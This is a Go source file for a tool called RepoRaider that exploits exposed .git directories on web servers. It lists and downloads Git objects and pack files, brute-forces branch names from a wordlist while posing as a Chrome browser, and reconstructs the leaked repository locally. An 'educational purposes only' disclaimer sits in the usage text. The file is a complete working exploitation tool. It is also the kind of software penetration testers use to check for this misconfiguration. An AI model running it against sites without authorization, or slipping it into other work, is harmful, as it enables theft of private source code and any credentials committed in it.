package main

import (
	"bufio"
	"bytes"
	"compress/zlib"
	"crypto/sha1"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/html"
)

// --------------------------------------------
// Global Variables & Flags
// --------------------------------------------

var (
	baseURL   string
	domain    string
	queue     chan string
	wg        sync.WaitGroup
	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36"

	// CLI Flags
	workers      int
	outputDir    string
	verbose      bool
	wordlistPath string
	throttleMs   int
	resume       bool

	verifyPack bool

	// Error collection
	mu        sync.Mutex
	errorList []string

	// For storing objects we've already validated this run
	validatedObjects sync.Map

	// For storing validated pack files
	validatedPacks sync.Map
)

// --------------------------------------------
// init & main
// --------------------------------------------

func init() {
	flag.IntVar(&workers, "workers", 10, "Number of concurrent download workers for objects/pack files")
	flag.StringVar(&outputDir, "o", "reconstructed_repo", "Output directory for the reconstructed repository")
	flag.BoolVar(&verbose, "v", false, "Enable verbose (debug) output")
	flag.StringVar(&wordlistPath, "wordlist", "", "Path to a file containing potential references (branch names)")
	flag.IntVar(&throttleMs, "throttle", 0, "Global throttle in milliseconds between reference brute force requests")
	flag.BoolVar(&resume, "resume", false, "Skip re-downloading objects/pack if local file is already valid")
	flag.BoolVar(&verifyPack, "verifyPack", false, "Run `git verify-pack` on downloaded pack files for deeper integrity checks")

	flag.Usage = func() {
		fmt.Println(`
 ____ ____ ____ ____ ____ ____ ____ ____ ____ ____
||R |||e |||p |||o |||R |||a |||i |||d |||e |||r ||
||__|||__|||__|||__|||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|
By Misec

A tool to exploit .git folder disclosure vulnerabilities. 
It identifies, downloads and reconstructs leaked Git repositories.

Usage:
  reporaider [options] <target_url>

Options:
  -workers <n>   Number of concurrent object/pack download workers (default 10).
  -o <dir>       Output directory for the reconstructed repository (default "reconstructed_repo").
  -v             Enable verbose (debug) output.
  -wordlist <file>
                 Optional. Path to a file containing potential reference
                 (branch) names. If provided, the tool will do a global-throttled
                 brute force on .git/refs/heads/<branch>.
  -throttle <ms> Global throttle in milliseconds between reference requests.
                 e.g. 0= no delay, 100= one request per 100ms, etc.
  -resume        Skip re-downloading objects if local file is valid (default false)
  -verifyPack    If set, run 'git verify-pack' after downloading a .pack file
                 for deeper integrity checks.

Examples:
  reporaider -v -workers 5 -o my_repo https://example.com/.git
  reporaider -wordlist ref_names.txt -throttle 100 https://target.com/.git
  reporaider -resume -verifyPack -v https://target.com/.git

Disclaimer:
  This tool is for educational purposes only. Unauthorized usage may violate
  local, national or international laws. Use responsibly.

  Note: When using this tool to download files, the user is fully responsible
  for handling or executing potentially malicious files. Analyze and verify
  any downloaded content before trusting it.`)
	}
}

func main() {
	flag.Parse()

	if flag.NArg() < 1 {
		flag.Usage()
		os.Exit(1)
	}
	baseURL = strings.TrimSuffix(flag.Arg(0), "/")

	parsedURL, err := url.Parse(baseURL)
	if err != nil {
		fmt.Printf("[ERROR] Invalid URL: %s\n", err)
		os.Exit(1)
	}
	domain = strings.ReplaceAll(parsedURL.Host, ":", "_")
	gitDir := filepath.Join(domain, ".git")

	fmt.Println("[+] Creating directory for repository ...")
	if err := os.MkdirAll(gitDir, 0755); err != nil && !os.IsExist(err) {
		logError(fmt.Sprintf("Failed to create .git directory: %s", err))
		os.Exit(1)
	}

	// 1) Enumerate object dirs
	fmt.Println("[+] Enumerating individual object directories ...")
	objectDirs, err := listObjectDirs()
	if err != nil {
		logError(fmt.Sprintf("Failed to list object directories: %s", err))
	}

	// Channel for enumerated items
	queue = make(chan string, 100)

	if len(objectDirs) == 0 {
		fmt.Println("[WARNING] Directory listing for objects/ may be disabled or returned nothing.")
	} else {
		fmt.Printf("[INFO] Found %d individual object directories.\n", len(objectDirs))
		for _, dir := range objectDirs {
			queue <- "objects/" + dir
		}
	}

	// 2) Enumerate pack files
	fmt.Println("[+] Enumerating pack files ...")
	packFiles, err := listPackFiles()
	if err != nil {
		logError(fmt.Sprintf("Failed to list pack files: %s", err))
	}
	if len(packFiles) == 0 {
		fmt.Println("[WARNING] No pack files found in pack/ directory.")
	} else {
		fmt.Printf("[INFO] Found %d pack files.\n", len(packFiles))
		for _, file := range packFiles {
			queue <- "pack/" + file
		}
	}

	// 3) If wordlist is provided... attempt global-throttled reference brute force
	if wordlistPath != "" {
		fmt.Printf("[+] Attempting to brute force references from wordlist (GLOBAL THROTTLE) at ~%d ms...\n", throttleMs)
		wl, err := readWordlist(wordlistPath)
		if err != nil {
			logError(fmt.Sprintf("Failed to read wordlist: %v", err))
		} else {
			bruteForceRefsGlobalThrottle(wl, throttleMs)
		}
	}

	// Close queue - start workers
	close(queue)
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go processQueue()
	}
	wg.Wait()
	fmt.Println("[+] Downloading completed.")

	autoRepairGitFolder(gitDir)
	fmt.Println("[+] Starting repository reconstruction ...")
	err = reconstructRepository()
	if err != nil {
		logError(fmt.Sprintf("Repository reconstruction failed: %s", err))
		os.Exit(1)
	}
	fmt.Println("[+] Repository successfully reconstructed.")

	if len(errorList) > 0 {
		fmt.Println("\n[INFO] The following errors/warnings were encountered:")
		for _, e := range errorList {
			fmt.Printf(" - %s\n", e)
		}
	}
}

// ---------------------------------------------------
//
//	listDirItems: Parse HTML to find <a href="...">
//
// ---------------------------------------------------
func listDirItems(url string, filter func(string) bool) ([]string, error) {
	data, err := downloadFile(url)
	if err != nil {
		return nil, err
	}
	doc, err := html.Parse(bytes.NewReader(data))
	if err != nil {
		return nil, err
	}

	var results []string
	var f func(*html.Node)
	f = func(n *html.Node) {
		if n.Type == html.ElementNode && n.Data == "a" {
			for _, attr := range n.Attr {
				if attr.Key == "href" {
					href := attr.Val
					if filter(href) {
						results = append(results, href)
					}
				}
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			f(c)
		}
	}
	f(doc)

	return results, nil
}

// --------------------------------------------
// Wordlist & GLOBAL THROTTLE for references
// --------------------------------------------

func readWordlist(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var words []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		w := strings.TrimSpace(scanner.Text())
		if w != "" {
			words = append(words, w)
		}
	}
	return words, scanner.Err()
}

// Single “global-limited” approach to references
func bruteForceRefsGlobalThrottle(wordlist []string, throttleMillis int) {
	ticker := time.NewTicker(time.Duration(throttleMillis) * time.Millisecond)
	defer ticker.Stop()

	for _, branch := range wordlist {
		if throttleMillis > 0 {
			<-ticker.C
		}
		refURL := fmt.Sprintf("%s/.git/refs/heads/%s", baseURL, branch)
		req, err := http.NewRequest("HEAD", refURL, nil)
		if err != nil {
			logError(fmt.Sprintf("Failed to create HEAD request for %s: %v", refURL, err))
			continue
		}
		req.Header.Set("User-Agent", userAgent)

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			logError(fmt.Sprintf("Request failed for %s: %v", refURL, err))
			continue
		}
		resp.Body.Close()

		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusForbidden {
			fmt.Printf("[BRUTE] Found possible branch ref: %s (HTTP %d)\n", branch, resp.StatusCode)
			sha, err := fetchRefContents(refURL)
			if err == nil && sha != "" {
				fmt.Printf("       => Commit: %s\n", sha)
			}
		} else {
			debugf("[DEBUG] Ref %s not found (HTTP %d)\n", branch, resp.StatusCode)
		}
	}
}

func fetchRefContents(refURL string) (string, error) {
	req, err := http.NewRequest("GET", refURL, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", userAgent)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("GET returned HTTP %d", resp.StatusCode)
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(body)), nil
}

// --------------------------------------------
// 2. Enumerating directories & pack files
// --------------------------------------------

func listObjectDirs() ([]string, error) {
	u := baseURL + "/objects/"
	debugf("[DEBUG] Requesting individual object directories: %s\n", u)

	items, err := listDirItems(u, func(href string) bool {
		return href != "../" && strings.HasSuffix(href, "/") && len(href) == 3
	})
	if err != nil {
		return nil, err
	}

	var dirs []string
	for _, item := range items {
		dirName := strings.TrimSuffix(item, "/")
		debugf("[DEBUG] Found object directory: %s\n", dirName)
		dirs = append(dirs, dirName)
	}
	return dirs, nil
}

func listPackFiles() ([]string, error) {
	u := baseURL + "/objects/pack/"
	debugf("[DEBUG] Requesting pack files: %s\n", u)
	items, err := listDirItems(u, func(href string) bool {
		return href != "../" && (strings.HasSuffix(href, ".pack") || strings.HasSuffix(href, ".idx"))
	})
	if err != nil {
		return nil, err
	}
	for _, pf := range items {
		debugf("[DEBUG] Found pack file: %s\n", pf)
	}
	return items, nil
}

// --------------------------------------------
// 3. Downloading objects & packs
// --------------------------------------------

func downloadFile(u string) ([]byte, error) {
	debugf("[DEBUG] Downloading: %s\n", u)
	req, err := http.NewRequest("GET", u, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request for %s: %v", u, err)
	}
	req.Header.Set("User-Agent", userAgent)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("http request failed for %s: %v", u, err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("http %d for %s", resp.StatusCode, u)
	}
	return io.ReadAll(resp.Body)
}

func processQueue() {
	defer wg.Done()
	for item := range queue {
		switch {
		case strings.HasPrefix(item, "objects/") && !strings.HasPrefix(item, "objects/pack/"):
			handleObjectDirItem(item)
		case strings.HasPrefix(item, "pack/"):
			handlePackItem(item)
		default:
			fmt.Printf("[WARNING] Unknown item in queue: %s\n", item)
		}
	}
}

// --------------------------------------------
// 3A. Handling Individual Objects
// --------------------------------------------

func handleObjectDirItem(item string) {
	dir := strings.TrimPrefix(item, "objects/")
	fmt.Printf("[INFO] Processing object directory: %s\n", dir)
	objectFiles, err := listObjectFiles(dir)
	if err != nil {
		logError(fmt.Sprintf("Failed to list objects in %s: %v", dir, err))
		return
	}
	if len(objectFiles) == 0 {
		fmt.Printf("[WARNING] No object files found in directory: %s\n", dir)
		return
	}
	fmt.Printf("[INFO] Found %d object files in directory %s.\n", len(objectFiles), dir)

	for _, fileName := range objectFiles {
		fullSHA := dir + fileName
		if isObjectAlreadyValidated(fullSHA) {
			debugf("[DEBUG] Object %s already validated this run. Skipping...\n", fullSHA)
			continue
		}

		objURL := fmt.Sprintf("%s/objects/%s/%s", baseURL, dir, fileName)
		objectPath := filepath.Join(domain, ".git", "objects", dir, fileName)

		// If resume is on and local file passes check... skip
		if resume && checkLocalObjectSHA1(objectPath, fullSHA) {
			fmt.Printf("[SKIP] Object %s already present & correct SHA-1. Skipping...\n", fullSHA)
			markObjectValidated(fullSHA)
			continue
		}

		data, err := downloadFile(objURL)
		if err != nil {
			logError(fmt.Sprintf("Failed to download %s: %v", fullSHA, err))
			continue
		}

		decompressed, objType, payload, err := parseGitObject(data)
		if err != nil {
			fmt.Printf("[WARNING] Object %s invalid: %v\n", fullSHA, err)
			continue
		}

		if !verifyObjectSHA1(fullSHA, objType, payload) {
			fmt.Printf("[WARNING] SHA-1 mismatch for object %s. Skipping...\n", fullSHA)
			continue
		}

		if err := os.MkdirAll(filepath.Dir(objectPath), 0755); err != nil {
			logError(fmt.Sprintf("Failed to create directory for %s: %v", fullSHA, err))
			continue
		}
		if err := os.WriteFile(objectPath, decompressed, 0644); err != nil {
			logError(fmt.Sprintf("Failed to write %s: %v", fullSHA, err))
			continue
		}
		fmt.Printf("[OK] Saved %s (type=%s)\n", fullSHA, objType)
		markObjectValidated(fullSHA)
	}
}

// --------------------------------------------
// 3B. Handling Pack Files
// --------------------------------------------

func handlePackItem(item string) {
	fileName := strings.TrimPrefix(item, "pack/")
	fmt.Printf("[INFO] Downloading pack file: %s\n", fileName)

	packURL := fmt.Sprintf("%s/objects/pack/%s", baseURL, fileName)
	packPath := filepath.Join(domain, ".git", "objects", "pack", fileName)

	if resume && isPackValidated(fileName, packPath, packURL) {
		fmt.Printf("[SKIP] Pack file %s already valid. Skipping...\n", fileName)
		return
	}

	data, err := downloadFile(packURL)
	if err != nil {
		logError(fmt.Sprintf("Failed to download pack file %s: %v", fileName, err))
		return
	}

	if err := os.MkdirAll(filepath.Dir(packPath), 0755); err != nil {
		logError(fmt.Sprintf("Failed to create directory for %s: %v", fileName, err))
		return
	}
	if err := os.WriteFile(packPath, data, 0644); err != nil {
		logError(fmt.Sprintf("Failed to write pack file %s: %v", fileName, err))
		return
	}
	fmt.Printf("[OK] Saved pack file %s\n", fileName)

	if verifyPack && strings.HasSuffix(fileName, ".pack") {
		if err := verifyDownloadedPackFile(packPath); err != nil {
			logError(fmt.Sprintf("verify-pack failed for %s: %v", fileName, err))
		} else {
			fmt.Printf("[INFO] Pack file %s verified successfully via git verify-pack.\n", fileName)
		}
	}

	validatedPacks.Store(fileName, true)
}

// verifyDownloadedPackFile runs `git verify-pack -v pack-xxxx.pack`
func verifyDownloadedPackFile(packPath string) error {
	cmd := exec.Command("git", "verify-pack", "-v", packPath)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("`git verify-pack` error: %v\nOutput: %s", err, string(output))
	}
	debugf("[DEBUG] verify-pack output:\n%s\n", string(output))
	return nil
}

// --------------------------------------------
// 3C. Smarter Checking
// --------------------------------------------

func isObjectAlreadyValidated(sha string) bool {
	_, ok := validatedObjects.Load(sha)
	return ok
}
func markObjectValidated(sha string) {
	validatedObjects.Store(sha, true)
}

// For pack: We do a size check vs remote “Content-Length”
func isPackValidated(fileName, localPath, remoteURL string) bool {
	_, ok := validatedPacks.Load(fileName)
	if ok {
		return true
	}
	info, err := os.Stat(localPath)
	if err != nil {
		return false
	}
	if info.IsDir() {
		return false
	}
	req, err := http.NewRequest("HEAD", remoteURL, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", userAgent)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	contentLenStr := resp.Header.Get("Content-Length")
	if contentLenStr == "" {
		return false
	}
	serverSize, err := strconv.ParseInt(contentLenStr, 10, 64)
	if err != nil {
		return false
	}
	return (info.Size() == serverSize)
}

// --------------------------------------------
// 3D. Parsing & Verifying Git Objects
// --------------------------------------------

func parseGitObject(zlibData []byte) (full []byte, objType string, payload []byte, err error) {
	rd, err := zlib.NewReader(bytes.NewReader(zlibData))
	if err != nil {
		return nil, "", nil, fmt.Errorf("zlib decompression failed: %v", err)
	}
	defer rd.Close()

	decomp, err := io.ReadAll(rd)
	if err != nil {
		return nil, "", nil, fmt.Errorf("reading decompressed data: %v", err)
	}
	nullIndex := bytes.IndexByte(decomp, 0)
	if nullIndex < 0 {
		return nil, "", nil, fmt.Errorf("no null terminator in object header")
	}
	header := string(decomp[:nullIndex])
	parts := strings.SplitN(header, " ", 2)
	if len(parts) != 2 {
		return nil, "", nil, fmt.Errorf("invalid object header")
	}
	objType = parts[0]
	szStr := parts[1]
	sz, err := strconv.Atoi(szStr)
	if err != nil {
		return nil, "", nil, fmt.Errorf("invalid size: %v", err)
	}
	payload = decomp[nullIndex+1:]
	if len(payload) != sz {
		return nil, "", nil, fmt.Errorf("payload size mismatch: expected %d, got %d", sz, len(payload))
	}
	return decomp, objType, payload, nil
}

func verifyObjectSHA1(shaHex, objType string, payload []byte) bool {
	header := fmt.Sprintf("%s %d\x00", objType, len(payload))
	buf := []byte(header)
	buf = append(buf, payload...)
	sum := sha1.Sum(buf)
	actualHex := hex.EncodeToString(sum[:])
	return strings.EqualFold(actualHex, shaHex)
}

func checkLocalObjectSHA1(localPath, shaHex string) bool {
	data, err := os.ReadFile(localPath)
	if err != nil {
		return false
	}
	_, objType, payload, err := parseGitObject(data)
	if err != nil {
		return false
	}
	header := fmt.Sprintf("%s %d\x00", objType, len(payload))
	buf := []byte(header)
	buf = append(buf, payload...)
	sum := sha1.Sum(buf)
	actualHex := hex.EncodeToString(sum[:])
	return strings.EqualFold(actualHex, shaHex)
}

// --------------------------------------------
// 4. Auto-Repair & Reconstruction
// --------------------------------------------

func autoRepairGitFolder(gitDir string) {
	headPath := filepath.Join(gitDir, "HEAD")
	if _, err := os.Stat(headPath); os.IsNotExist(err) {
		fmt.Println("[INFO] HEAD file missing. Creating minimal HEAD...")
		defaultHead := "ref: refs/heads/master\n"
		_ = os.WriteFile(headPath, []byte(defaultHead), 0644)
	}
	configPath := filepath.Join(gitDir, "config")
	if _, err := os.Stat(configPath); os.IsNotExist(err) {
		fmt.Println("[INFO] config file missing. Creating minimal config...")
		defaultConfig := `[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
`
		_ = os.WriteFile(configPath, []byte(defaultConfig), 0644)
	}
	masterRefPath := filepath.Join(gitDir, "refs", "heads")
	_ = os.MkdirAll(masterRefPath, 0755)
	masterFile := filepath.Join(masterRefPath, "master")
	if _, err := os.Stat(masterFile); os.IsNotExist(err) {
		fmt.Println("[INFO] refs/heads/master missing. Creating minimal reference...")
		allZeroCommit := "0000000000000000000000000000000000000000\n"
		_ = os.WriteFile(masterFile, []byte(allZeroCommit), 0644)
	}
}

func reconstructRepository() error {
	downloadedGitPath := filepath.Join(domain, ".git")
	repoPath := outputDir

	if err := os.MkdirAll(repoPath, 0755); err != nil && !os.IsExist(err) {
		return fmt.Errorf("failed to create repository directory: %v", err)
	}

	fmt.Printf("[INFO] Initializing a new Git repository at %s\n", repoPath)
	cmdInit := exec.Command("git", "init", repoPath)
	initOutput, initErr := cmdInit.CombinedOutput()
	if initErr != nil {
		return fmt.Errorf("failed to initialize Git repo: %v\n%s", initErr, string(initOutput))
	}

	existingGitPath := filepath.Join(repoPath, ".git")
	if err := os.RemoveAll(existingGitPath); err != nil {
		return fmt.Errorf("failed to remove existing .git: %v", err)
	}

	if err := copyDir(downloadedGitPath, existingGitPath); err != nil {
		return fmt.Errorf("failed to copy downloaded .git: %v", err)
	}
	if err := os.Chdir(repoPath); err != nil {
		return fmt.Errorf("failed to chdir to %s: %v", repoPath, err)
	}

	fmt.Println("[INFO] Verifying repository integrity...")
	cmdFsck := exec.Command("git", "fsck", "--full")
	fsckOut, fsckErr := cmdFsck.CombinedOutput()
	if fsckErr != nil {
		fmt.Printf("[ERROR] Git fsck failed: %v\nOutput: %s\n", fsckErr, string(fsckOut))
	} else {
		fmt.Printf("[OK] Git fsck output:\n%s\n", string(fsckOut))
	}

	fmt.Println("[INFO] Checking out all files from the repository...")
	cmdCheckout := exec.Command("git", "checkout", "--")
	coOut, coErr := cmdCheckout.CombinedOutput()
	if coErr != nil {
		return fmt.Errorf("git checkout failed: %v\nOutput: %s", coErr, string(coOut))
	}
	fmt.Printf("[OK] Git checkout output:\n%s\n", string(coOut))

	return nil
}

// --------------------------------------------
// 5. Copy Utilities
// --------------------------------------------

func copyDir(src, dst string) error {
	if err := os.MkdirAll(dst, 0755); err != nil {
		return err
	}
	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}
	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())

		info, err := entry.Info()
		if err != nil {
			return err
		}
		if info.IsDir() {
			if err := copyDir(srcPath, dstPath); err != nil {
				return err
			}
		} else {
			if err := copyFile(srcPath, dstPath); err != nil {
				return err
			}
		}
	}
	return nil
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	if _, err = io.Copy(out, in); err != nil {
		return err
	}
	if stat, err := os.Stat(src); err == nil {
		_ = os.Chmod(dst, stat.Mode())
	}
	return nil
}

// --------------------------------------------
// 6. Logging / Error Helpers
// --------------------------------------------

func logError(msg string) {
	mu.Lock()
	defer mu.Unlock()
	errorList = append(errorList, msg)
}

func debugf(format string, args ...interface{}) {
	if verbose {
		fmt.Printf(format, args...)
	}
}

// listObjectFiles uses listDirItems
func listObjectFiles(dir string) ([]string, error) {
	u := fmt.Sprintf("%s/objects/%s/", baseURL, dir)
	debugf("[DEBUG] Listing object files from: %s\n", u)
	items, err := listDirItems(u, func(href string) bool {
		return href != "../" && len(href) == 38
	})
	if err != nil {
		return nil, err
	}
	return items, nil
}
